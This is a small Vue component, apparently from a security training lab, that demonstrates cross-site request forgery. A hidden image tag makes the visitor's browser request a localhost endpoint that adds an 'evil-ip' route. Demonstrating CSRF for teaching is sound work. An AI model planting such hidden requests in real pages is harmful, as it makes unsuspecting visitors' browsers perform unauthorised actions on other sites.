<template>
  <div>
    <v-row>
      <v-col>
        <div class="d-flex justify-space-between align-center mb-6">
          <h1 class="text-h3">CSRF via Image</h1>
        </div>

        <img src="/monster-1297726_1280.png" height="200">
        <img src="http://localhost:8080/csrf/addRoute?route=evil-ip-234" style="display: none">
      </v-col>
    </v-row>
  </div>
</template>

<script setup lang="ts">
import { ref, onMounted } from 'vue'


</script>